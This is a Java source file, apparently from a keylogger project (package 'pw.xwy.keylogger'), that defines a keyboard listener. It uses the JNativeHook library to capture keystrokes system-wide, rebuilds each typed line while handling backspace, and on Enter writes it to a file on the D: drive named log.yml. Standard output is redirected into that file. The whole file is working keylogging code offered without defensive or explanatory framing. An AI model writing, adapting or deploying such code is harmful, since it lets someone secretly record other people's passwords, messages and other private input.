package pw.xwy.keylogger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.*;

public class Listener implements NativeKeyListener {
	
	private PrintStream outy;
	private String st = "";
	
	Listener() {
		File f = new File("D:/log.yml");
		if (!f.exists()) {
			try {
				f.createNewFile();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		try {
			outy = new PrintStream(new FileOutputStream(f));
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}
		System.setOut(outy);
	}
	
	public void nativeKeyPressed(NativeKeyEvent e) {
	}
	
	public void nativeKeyReleased(NativeKeyEvent e) {
	}
	
	public void nativeKeyTyped(NativeKeyEvent e) {
		if (e.getKeyChar() == 8) {
			if (st.length() != 0) {
				st = st.substring(0, st.length() - 1);
			}
		} else if (e.getKeyChar() == 13) {
			//enter
			System.out.println(st);
			st = "";
		} else {
			st += String.valueOf(e.getKeyChar());
		}
	}
}
